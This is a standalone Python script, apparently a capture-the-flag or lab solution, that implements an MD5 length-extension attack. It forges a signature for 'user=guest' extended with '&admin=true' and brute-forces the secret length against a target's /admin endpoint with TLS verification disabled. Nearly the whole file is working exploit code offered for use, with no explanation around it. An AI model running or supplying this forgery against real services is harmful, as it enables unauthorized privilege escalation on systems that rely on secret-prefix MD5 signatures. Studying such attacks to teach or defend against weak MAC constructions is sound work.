import struct, sys, urllib.parse, urllib.request, ssl

# ---- pure-python MD5 with injectable state ----
import math
s = [7,12,17,22, 7,12,17,22, 7,12,17,22, 7,12,17,22,
     5, 9,14,20, 5, 9,14,20, 5, 9,14,20, 5, 9,14,20,
     4,11,16,23, 4,11,16,23, 4,11,16,23, 4,11,16,23,
     6,10,15,21, 6,10,15,21, 6,10,15,21, 6,10,15,21]
K = [int(abs(math.sin(i+1))*2**32) & 0xFFFFFFFF for i in range(64)]
def lrot(x,c): return ((x<<c)|(x>>(32-c))) & 0xFFFFFFFF
def md5_compress(a0,b0,c0,d0, chunk):
    A,B,C,D=a0,b0,c0,d0
    M=struct.unpack('<16I', chunk)
    for i in range(64):
        if i<16: F=(B&C)|(~B&D); g=i
        elif i<32: F=(D&B)|(~D&C); g=(5*i+1)%16
        elif i<48: F=B^C^D; g=(3*i+5)%16
        else: F=C^(B|~D); g=(7*i)%16
        F=(F+A+K[i]+M[g])&0xFFFFFFFF
        A=D; D=C; C=B; B=(B+lrot(F,s[i]))&0xFFFFFFFF
    return (a0+A)&0xFFFFFFFF,(b0+B)&0xFFFFFFFF,(c0+C)&0xFFFFFFFF,(d0+D)&0xFFFFFFFF

def md5_pad(msglen):
    pad=b'\x80'
    pad+=b'\x00'*((56-(msglen+1))%64)
    pad+=struct.pack('<Q', msglen*8)
    return pad

def length_extension(orig_hex, orig_msg, append, secret_len):
    # state from orig_hex
    a,b,c,d = struct.unpack('<4I', bytes.fromhex(orig_hex))
    # glue padding for (secret || orig_msg)
    total = secret_len + len(orig_msg)
    glue = md5_pad(total)
    new_msg = orig_msg + glue + append
    # continue hashing 'append' with pre-length = secret_len+len(orig_msg)+len(glue)
    prelen = total + len(glue)
    data = append + md5_pad(prelen + len(append))
    for i in range(0,len(data),64):
        a,b,c,d = md5_compress(a,b,c,d, data[i:i+64])
    new_sig = struct.pack('<4I',a,b,c,d).hex()
    return new_sig, new_msg

U=sys.argv[1]
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
orig_sig="875be63c02219558612e282db6b3344b"; orig_msg=b"user=guest"; append=b"&admin=true"
def get(p):
    try: return urllib.request.urlopen(U+p, context=ctx, timeout=8).read().decode('latin-1')
    except Exception as e: return "ERR:"+str(e)
# sanity: verify our md5 of a known string
import hashlib
assert hashlib.md5(b"user=guest").hexdigest()==struct.pack('<4I',*md5_compress(0x67452301,0xefcdab89,0x98badcfe,0x10325476, b"user=guest"+md5_pad(10))).hex(), "md5 impl broken"
print("md5 impl OK")
for slen in range(0,41):
    ns, nm = length_extension(orig_sig, orig_msg, append, slen)
    qp=urllib.parse.quote(nm, safe='')
    r=get(f"/admin?msg={qp}&sig={ns}")
    if r.strip() not in ("bad","bad sig"):
        print("SLEN",slen,"->",r[:500]); break
else:
    print("no luck")
